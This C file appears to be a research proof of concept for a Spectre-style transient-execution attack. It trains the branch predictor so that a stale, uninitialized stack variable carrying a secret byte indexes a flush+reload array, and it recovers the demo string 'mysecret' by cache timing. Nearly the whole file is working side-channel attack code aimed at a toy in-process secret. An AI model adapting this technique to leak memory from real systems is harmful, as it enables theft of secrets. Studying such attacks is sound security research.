#include <stdio.h>
#include <time.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define CACHE_HIT   100
#define CL_SIZE     64          //CACHE LINE SIZE
#define PAGE_SIZE   4096
#define N_PAGES     256

#define REPETITIONS 1000
#define N_TRAINING  10
#define SECRET_SIZE 9
#define SECRET      "mysecret"

#define false       0
#define true        1
#define DBG         false


cp_t* flush_reload_arr;
volatile cp_t cp;   //cache page declared out of function to keep stack of uninit_func() identical to init_func()

void touch_secret(int secret_index) {
    volatile char __attribute__((aligned(PAGE_SIZE))) s;
    s = SECRET[secret_index];
    if(DBG)printf("secret\t%p:\t%d\n", &s, s);
}

void init_func(int val) {
    volatile char __attribute__((aligned(PAGE_SIZE))) init;
    init = val;
    if(DBG)printf("init  \t%p:\t%d\n", &init, init);
}

void uninit_func() {
    volatile char __attribute__((aligned(PAGE_SIZE))) uninit;
    cp = flush_reload_arr[uninit];
    if(DBG)printf("uninit\t%p:\t%d\n", &uninit, uninit);
}

/*
 * Variables required in cache:
 *  val
 * Variables required in mem:
 *  init_bool_copy
 *
 * Training: init_bool=false    secret_index=0
 * Attack:   init_bool=true     secret_index={iterate through SECRET}
 */
void victim_func(char init_bool, int secret_index) {
    if(init_bool) touch_secret(secret_index);
    //increase branch history for better accuracy
    for(int i = 0; i < 100; i++) {
        if(i%2==0)  {volatile int x = 0;}
        else        {volatile int x = 1;}
    }

    int init_bool_copy __attribute__((aligned(CL_SIZE)));
    init_bool_copy = init_bool;
    flush(&init_bool_copy);
    cpuid();

    if(init_bool_copy) init_func(5);
    else               uninit_func();
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);
    cpuid();

    int n_accesses =    N_TRAINING + 1;
    char init_bools    [n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0;  i < n_accesses; i++) {
        init_bools     [i] = false;
        secret_indices [i] = 0;
    }
    init_bools         [n_accesses-1] = true;
    secret_indices     [n_accesses-1] = secret_index;

    for(int i = 0; i < n_accesses; i++) {
        victim_func(init_bools[i], secret_indices[i]);
        cpuid();
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();

    }

    cpuid();
    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT);
    free_flush_reload(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    clock_t start2 = clock();

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    clock_t end2 = clock();
    double measured_time = ((double)(end2 - start2))/CLOCKS_PER_SEC;

    print_results(results, REPETITIONS, SECRET, SECRET_SIZE, N_PAGES, CACHE_HIT, measured_time);

    free_results(results, REPETITIONS, SECRET_SIZE);
}